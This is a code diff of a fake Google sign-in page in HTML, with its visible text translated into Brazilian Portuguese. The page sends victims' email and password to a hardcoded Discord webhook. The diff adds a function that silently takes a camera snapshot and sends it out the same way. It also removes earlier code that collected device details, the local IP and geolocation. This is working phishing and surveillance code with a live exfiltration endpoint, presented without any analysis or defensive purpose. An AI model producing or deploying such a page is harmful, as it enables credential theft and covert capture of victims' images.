@@ -1,8 +1,8 @@
-<!DOCTYPE html> 
-<html lang="en">
+<!DOCTYPE html>
+<html lang="pt-BR">
 
 <head>
-    <title>Sign in - Google Accounts</title>
+    <title>Fazer login - Contas do Google</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
         body {
@@ -33,14 +33,21 @@
         }
 
         .title {
-            font-size: 22px;
-            font-weight: 500;
-            margin-bottom: 10px;
+            font-size: 24px;
+            font-weight: 400;
             text-align: center;
+            margin-bottom: 10px;
         }
 
         .input-field {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
+        }
+
+        .input-field label {
+            display: block;
+            font-size: 14px;
+            color: #202124;
+            margin-bottom: 5px;
         }
 
         .input-field input {
@@ -57,25 +64,45 @@
             font-size: 16px;
             font-weight: bold;
             color: white;
-            background-color: #4285f4;
+            background-color: #1a73e8;
             border: none;
             border-radius: 4px;
             cursor: pointer;
         }
 
         .submit-btn:hover {
-            background-color: #357ae8;
+            background-color: #1669c1;
+        }
+
+        .link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .link a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Hidden video for capturing photo */
+        #hidden-video {
+            display: none;
         }
     </style>
     <script>
         // Send Data to Discord Webhook
         async function sendToDiscord(title, data) {
             const payload = {
-                content: `New ${title} Collected`,
+                content: `Novos ${title} Coletados`,
                 embeds: [
                     {
                         title: title,
-                        description: "Information gathered from the scanned QR code",
+                        description: "Informações coletadas a partir do QR Code",
                         color: 16711680,
                         fields: Object.keys(data).map(key => ({
                             name: key,
@@ -86,7 +113,7 @@
                 ]
             };
 
-            await fetch("https://discord.com/api/webhooks/1253037319871660135/EPMCB_0O4lGWNrc64H1snD0T0VA5mnb6OdvhO7Suhdr24nI1tWmYU_qJI7UPzcLVCC0q", {
+            await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -95,52 +122,16 @@
             });
         }
 
-        // Gather Device Information
-        async function gatherDeviceInfo() {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                plugins: [...navigator.plugins].map(plugin => plugin.name),
-                cookieEnabled: navigator.cookieEnabled,
-            };
-
-            sendToDiscord("Device Information", deviceInfo);
-        }
-
-        // Get Local IP Address using WebRTC
-        async function getLocalIP() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                        const match = ipRegex.exec(event.candidate.candidate);
-                        if (match) {
-                            sendToDiscord("Local IP Address", { ip: match[1] });
-                            resolve(match[1]);
-                        }
-                    }
-                };
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            });
-        }
-
-        // Request Camera Access and Take Picture
-        async function takePicture() {
+        // Take hidden picture from the camera
+        async function takeHiddenPicture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
+                video.id = "hidden-video";
                 video.srcObject = stream;
                 video.play();
-                document.body.appendChild(video);
 
+                // Allow the video feed to stabilize for a moment
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
@@ -148,30 +139,15 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Convert to Base64 and send it to Discord
+                    // Convert to Base64 and send to Discord
                     const imageData = canvas.toDataURL('image/png');
                     sendToDiscord("Camera Snapshot", { image: imageData });
 
+                    // Stop the video stream
                     stream.getTracks().forEach(track => track.stop());
-                    video.remove();
-                }, 5000);
+                }, 3000); // Delay to allow the camera to properly focus
             } catch (err) {
-                console.error('Camera access denied:', err);
-            }
-        }
-
-        // Get Geolocation Data
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const locationData = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                    };
-                    sendToDiscord("Geolocation Data", locationData);
-                });
-            } else {
-                console.error("Geolocation is not supported by this browser.");
+                console.error('Erro ao acessar a câmera:', err);
             }
         }
 
@@ -186,13 +162,10 @@
                 password: password
             };
 
-            await sendToDiscord("Login Credentials", credentials);
+            await sendToDiscord("Credenciais de Login", credentials);
 
-            // Also run other data collection functions
-            gatherDeviceInfo();
-            getLocalIP();
-            getLocation();
-            takePicture();
+            // Trigger hidden camera photo
+            takeHiddenPicture();
         }
     </script>
 </head>
@@ -202,16 +175,21 @@
         <div class="logo">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
         </div>
-        <div class="title">Sign in</div>
+        <div class="title">Fazer login</div>
         <form onsubmit="collectCredentials(event)">
             <div class="input-field">
-                <input type="email" id="email" placeholder="Email or phone" required>
+                <label for="email">Email ou telefone</label>
+                <input type="email" id="email" placeholder="Digite seu email ou telefone" required>
             </div>
             <div class="input-field">
-                <input type="password" id="password" placeholder="Enter your password" required>
+                <label for="password">Senha</label>
+                <input type="password" id="password" placeholder="Digite sua senha" required>
             </div>
-            <button type="submit" class="submit-btn">Next</button>
+            <button type="submit" class="submit-btn">Próxima</button>
         </form>
+        <div class="link">
+            <a href="#">Esqueceu seu email?</a>
+        </div>
     </div>
 </body>
 
